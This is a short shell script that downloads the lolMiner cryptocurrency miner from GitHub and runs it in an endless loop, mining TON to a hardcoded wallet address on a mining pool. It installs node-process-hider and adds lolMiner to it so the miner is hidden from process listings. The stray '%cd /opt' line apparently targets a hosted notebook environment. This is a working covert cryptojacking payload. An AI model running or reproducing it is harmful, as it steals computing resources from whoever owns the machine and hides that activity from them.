#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 89 97
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
sudo apt install libpci3
sudo apt-get install screen
wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar xvf lolMiner_v1.42_Lin64.tar.gz && mv 1.42 mng && cd mng && chmod +x lolMiner
while [ 1 ]; do
./lolMiner -a TON -p https://pool.services.tonwhales.com -u EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
sleep 30
done
